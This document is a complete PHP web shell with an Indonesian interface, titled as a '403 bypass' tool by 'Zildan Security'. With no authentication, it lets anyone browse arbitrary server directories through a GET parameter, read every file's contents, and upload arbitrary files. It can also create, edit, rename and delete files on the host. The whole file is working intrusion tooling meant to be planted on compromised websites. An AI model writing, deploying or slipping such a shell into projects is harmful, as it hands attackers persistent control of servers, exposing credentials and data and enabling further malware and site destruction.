<?php
$directory = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

function getFilesInDirectory($directory) {
    $files = array();
    if ($handle = opendir($directory)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $files[] = $file;
            }
        }
        closedir($handle);
    }
    return $files;
}

function editFile($filename, $content) {
    $handle = fopen($filename, 'w');
    fwrite($handle, $content);
    fclose($handle);
}

function renameFile($oldName, $newName) {
    rename($oldName, $newName);
}

function uploadFile($directory, $tmpFile, $fileName) {
    $filePath = $directory . '/' . $fileName;
    if (move_uploaded_file($tmpFile, $filePath)) {
        return true;
    } else {
        return false;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['uploaded_file'])) {
        $uploadedFile = $_FILES['uploaded_file'];
        $tmpFile = $uploadedFile['tmp_name'];
        $fileName = $uploadedFile['name'];
        if (!empty($fileName)) {
            $uploadStatus = uploadFile($directory, $tmpFile, $fileName);
            if ($uploadStatus) {
                echo "File berhasil diunggah! => " . htmlspecialchars($directory . '/' . $fileName);
            } else {
                echo "File gagal diunggah :(";
            }
        }
    } else if (isset($_POST['new_file'])) {
        $newFileName = $_POST['new_file'];
        if (!empty($newFileName)) {
            $newFileName = basename($newFileName);
            $newFilePath = $directory . '/' . $newFileName;
            if (!file_exists($newFilePath)) {
                $handle = fopen($newFilePath, 'w');
                fclose($handle);
            }
        }
    } else if (isset($_POST['delete_file'])) {
        $fileToDelete = $_POST['delete_file'];
        $fileToDelete = basename($fileToDelete);
        $filePath = $directory . '/' . $fileToDelete;
        if (file_exists($filePath)) {
            unlink($filePath);
        }
    } else if (isset($_POST['edit_file'])) {
        $fileName = $_POST['edit_file'];
        $fileContent = $_POST['file_content'];
        $fileName = basename($fileName);
        $filePath = $directory . '/' . $fileName;
        if (file_exists($filePath)) {
            editFile($filePath, $fileContent);
        }
    } else if (isset($_POST['rename_file'])) {
        $oldFileName = $_POST['rename_file'];
        $newFileName = $_POST['new_name'];
        $oldFileName = basename($oldFileName);
        $newFileName = basename($newFileName);
        $oldFilePath = $directory . '/' . $oldFileName;
        $newFilePath = $directory . '/' . $newFileName;
        if (file_exists($oldFilePath) && !file_exists($newFilePath)) {
            renameFile($oldFilePath, $newFilePath);
        }
    }
}

$files = getFilesInDirectory($directory);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Berantakan Bypass 403, Auto delete DLL - Zildan Security</title>
    <style>
/* style.css */
body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  background-color: #f5f5f5;
}

.container {
  max-width: 800px;
  margin: 0 auto;
  padding: 20px;
  background-color: #fff;
  border-radius: 5px;
  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
}

h2 {
  color: #333;
}

h3 {
  color: #555;
  margin-top: 20px;
}

ul {
  list-style-type: none;
  padding: 0;
}

li {
  margin-bottom: 10px;
}

form {
  display: inline;
}

button {
  background-color: #007bff;
  color: #fff;
  border: none;
  padding: 5px 10px;
  border-radius: 5px;
  cursor: pointer;
}

        </style>
        <script>
// script.js
document.addEventListener("DOMContentLoaded", function () {
  const editForms = document.querySelectorAll(".edit-form");
  editForms.forEach(function (form) {
    form.addEventListener("submit", function (e) {
      e.preventDefault();
      const formData = new FormData(form);
      const fileContent = formData.get("file_content");
      const fileName = formData.get("edit_file");
      // Lakukan request AJAX untuk mengirim perubahan ke server (opsional)
    });
  });
});

            </script>
</head>
<body>
    <h2>PHP Berantakan Bypass 403, Auto delete DLL - Zildan Security</h2>
    
    <h3>Direktori Saat Ini: <?php echo htmlspecialchars($directory); ?></h3>

    <h3>Daftar File:</h3>
    <ul>
        <?php foreach ($files as $file) { ?>
            <li>
                <?php echo htmlspecialchars($file); ?>
                <form action="" method="POST" style="display:inline">
                    <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($file); ?>">
                    <textarea name="file_content" rows="2" cols="30"><?php echo htmlspecialchars(file_get_contents($directory . '/' . $file)); ?></textarea>
                    <button type="submit">Edit</button>
                </form>
                <form action="" method="POST" style="display:inline">
                    <input type="hidden" name="rename_file" value="<?php echo htmlspecialchars($file); ?>">
                    <input type="text" name="new_name" placeholder="New name">
                    <button type="submit">Rename</button>
                </form>
            </li>
        <?php } ?>
    </ul>

    <h3>Tambah File Baru:</h3>
    <form action="" method="POST">
        <input type="text" name="new_file" placeholder="Nama file baru">
        <button type="submit">Tambah</button>
    </form>

    <h3>Hapus File:</h3>
    <form action="" method="POST">
        <select name="delete_file">
            <?php foreach ($files as $file) { ?>
                <option value="<?php echo htmlspecialchars($file); ?>"><?php echo htmlspecialchars($file); ?></option>
            <?php } ?>
        </select>
        <button type="submit">Hapus</button>
    </form>

    <h3>Ganti Direktori:</h3>
    <form action="" method="GET">
        <input type="text" name="dir" placeholder="Masukkan path direktori">
        <button type="submit">Go</button>
    </form>

    <h3>Unggah File:</h3>
    <form action="" method="POST" enctype="multipart/form-data">
        <input type="file" name="uploaded_file">
        <button type="submit">Unggah</button>
    </form>
    
</body>
</html>
